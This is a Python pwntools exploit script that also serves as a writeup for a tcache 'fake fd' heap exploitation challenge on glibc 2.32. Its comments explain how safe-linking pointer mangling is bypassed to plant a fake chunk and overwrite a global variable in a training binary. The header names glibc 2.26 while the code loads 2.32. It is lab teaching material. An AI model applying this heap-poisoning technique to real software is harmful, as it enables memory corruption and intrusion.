#!/usr/bin/env python3
'''
Tcache Fake Fd Challenge writeup:
- Run on GLibC version 2.26
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.32/libc-2.32.so'
env = {}

# Binary setup
elf_name = '.fake_fd-2.32' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
        p = process([elf.path], env=env, aslr=False)
        gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.32/
''') 

else: 
	p = remote(domain, port) 

'''
Mangle pointer code taken from 
https://github.com/mdulin2/mangle/blob/master/mangle.py
'''
# Mangle the ptr
def mangle_ptr(fd_ptr, storage_location, print_hex=False):
        if(print_hex):
                return hex((storage_location >> 12) ^ fd_ptr)
        return (storage_location >> 12) ^ fd_ptr

'''
We when write our data, there is already a use after free
without us doing anything! So, we have a 0x30 tcache chunk
that we can write the 'fd' pointer for. Prior to writing our
data, the tcache looks like the following: 
- 0x30: A->B

All we have to do is write to the location of the variable
'important_string' and our chunk will be in the tcache bin. 

Once we execute the write, the tcache looks like below: 
- 0x30: A -> 'important_string' (fake chunk). 

However, in 2.32+ of Malloc 'pointer mangling' 
has been implemented. This 'encrypts' the fd pointer with 
the storage location of the pointer itself. The algorithm 
for 'encrypting' the pointer is below: 

Mangled_ptr = Fd_Ptr XOR (Pointer Storage Location >> 12) 
- Fd_Ptr is the 'next' pointer being mangled
- Pointer Storage Location is the memory address where the pointer
  is being saved at. This acts as the symmetric encryption key. 

The encryption prevents a straight overwrite of the 'fd' pointer. 
Instead, a heap leak is required and the location on the heap
where the pointer is written is also required. However, if we 
know the memory address where this pointer is at, we will 
be able to 'encrypt' our own pointer. 

So, the following is slightly more accurate:
0x30: A -> ENCRYPTED 'important_string' (fake chunk)


NOTE: pwndbg does not understand what a 'mangled' pointer is. 
So, manual validation must be done for this to work.
'''

# Starting position of the heap (ASLR turned off) 
HEAP_BASE = 0x405000

# Offset from start of heap to storage location of the mangled pointer
storage_location_offset = 0x2a0


print("Overwriting fd pointer of tcache chunk")
fake_fd_location = elf.symbols['important_string']
print("Fake fd location: {}".format(hex(fake_fd_location)))

# Get the storage location for part of the mangling
storage_location = HEAP_BASE + storage_location_offset
print("Heap Pointer Storage Location is: {}".format(hex(storage_location)))


# Encrypt the pointer
mangled_ptr = mangle_ptr(0x404060, storage_location_offset + HEAP_BASE) # TODO: Add the mangling step here with 'mangle_ptr' 
print("Mangled Pointer value: {}".format(hex(mangled_ptr)))

p.sendlineafter("Data:", p64(mangled_ptr) )

'''
On the second call to malloc, the 0x30 tcache bin looks
like the following: 
- 0x30: A -> fake_chunk.

So, prior to getting our fake_chunk (at 'important_string') 
we need to allocate ONE chunk before this. Luckily, 
there is a malloc chunk that does exactly this. 
Remember that the tcache and fastbin are LIFO (last in first out). 

Preparing for our third call to malloc, the tcache bin 
looks like the following: 
- 0x30: fake_chunk

Now, we can write to this location with an arbitrary value!
'''

print("Sending data to overwrite our choosen address")
value = "DEADBEEF" 
p.sendlineafter("victim:", value) 
p.interactive()

